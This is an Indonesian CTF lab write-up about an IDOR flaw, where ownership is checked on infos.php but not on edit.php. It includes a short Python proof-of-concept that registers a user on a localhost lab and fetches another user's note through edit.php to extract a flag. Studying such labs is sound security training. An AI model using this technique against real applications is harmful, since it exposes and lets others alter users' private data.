---
title: Akses Data Lagi
description: Writeup lab Akses Data Lagi
tags:
  - access control
  - IDOR
  - CTF
draft: false
---

## Summary
* Vuln Name: Insecure Direct Object Reference (IDOR) on Edit Function
* Type: Broken access control
* Impact: Information Disclosure / Data Manipulation
* Severity: High
* functionality: [[data-retrieval]], [[data-modification]]

## Metodologi dan Observasi
1. Pada lab ini, pengembang telah menyadari kerentanan [[IDOR]] pada halaman utama untuk melihat catatan (`infos.php`).
2. Terdapat mekanisme pengecekan [[authorization]] di file `infos.php`:
   ```php
   // SECURITY CHECK: Ensure user owns the note
   if ($note['user_id'] != $_SESSION['user_id']) {
       session_destroy();
       header('Location: /index.php');
       exit;
   }
   ```
3. Jika kita mencoba memaksa melihat catatan pengguna lain melalui `/infos.php?id=3`, sistem akan mendeteksi pelanggaran akses, menghancurkan sesi kita (melakukan _logout_), dan mengarahkan kembali ke halaman _login_.
4. Namun, aplikasi sering kali memiliki beberapa [*endpoint*](https://en.wikipedia.org/wiki/Web_API) atau rute yang menangani objek yang sama. Dalam kasus ini, terdapat halaman `/edit.php` untuk memodifikasi catatan.
5. Saat menginvestigasi file `edit.php`, ternyata pengembang **lupa** mengimplementasikan fungsi pengecekan kepemilikan serupa yang ada di `infos.php`.
6. Parameter `id` pada `/edit.php?id=3` diproses tanpa validasi `user_id`, sehingga celah IDOR kembali terbuka. Modus kerentanan di mana pengamanan diterapkan secara tidak merata pada fitur yang berbeda disebut sebagai *Inconsistent Access Control*.

## PoC
Skrip berikut akan mendaftarkan akun baru, mendapatkan sesi login, lalu secara langsung mengakses form _edit_ dari catatan ID ke-3 (milik admin).

```python
import requests
import re

url = "http://localhost:1337"

s = requests.Session()

# 1. Register & Login
s.post(f"{url}/auth.php", data={'action': 'register', 'username': 'hacker', 'password': '123', 'email': 'hacker@test.com'})
s.post(f"{url}/auth.php", data={'action': 'login', 'username': 'hacker', 'password': '123'})

# 2. Bypass IDOR via edit.php (Assume Admin note is ID 3)
res = s.get(f"{url}/edit.php?id=3")

# 3. Mencari pola flag pada response (misalnya ada di dalam textarea)
if "pwn{" in res.text:
    flag = re.search(r'pwn\{.*?\}', res.text).group(0)
    print(f"[+] Flag found via edit.php: {flag}")
```

## Impact
Penyerang tidak hanya dapat membaca data yang bersifat rahasia (Information Disclosure) melalui nilai atribut pada halaman *edit*, tetapi juga dapat mengubah isi data milik orang lain ([[data-modification]]), yang dapat menyebabkan kerugian lebih besar.
